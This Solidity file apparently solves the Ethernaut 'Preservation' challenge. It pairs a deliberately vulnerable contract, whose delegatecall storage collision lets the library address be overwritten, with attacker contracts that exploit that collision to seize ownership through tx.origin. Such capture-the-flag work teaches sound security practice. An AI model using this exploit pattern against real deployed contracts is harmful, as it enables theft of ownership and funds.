// SPDX-License-Identifier: MIT
pragma solidity 0.6.11;

contract Preservation {
  address public address1;
  address public address2;
  address public owner; 
  uint storedNumber;

  constructor(address _address1, address _address2) public {
    address1 = _address1; 
    address2 = _address2; 
    owner = msg.sender;
  }
 
  function setFirstNumber(uint _number) public {
    (bool success, ) = address1.delegatecall(abi.encodeWithSelector(bytes4(keccak256('setNumber(uint256)')), _number));
    require(success);
  }

  function setSecondNumber(uint _number) public {
    (bool success, ) = address2.delegatecall(abi.encodeWithSelector(bytes4(keccak256('setNumber(uint256)')), _number));
    require(success);
  }
}


contract LibraryContract {
  uint storedNumber;  

  function setNumber(uint _number) public {
    storedNumber = _number;
  }
}


contract MyLibraryContract {

  address public address1; 
  address public address2;
  address public owner;           
  uint storedNumber; 

  function setNumber(uint _number) public {
    owner = tx.origin;
  }
}


contract PreservationHack {
    function hack(address target, address libAddr) public {
        (bool success, ) = target.call(abi.encodeWithSelector(bytes4(keccak256("setSecondNumber(uint256)")), uint256(libAddr)));
    require(success);
    }
}
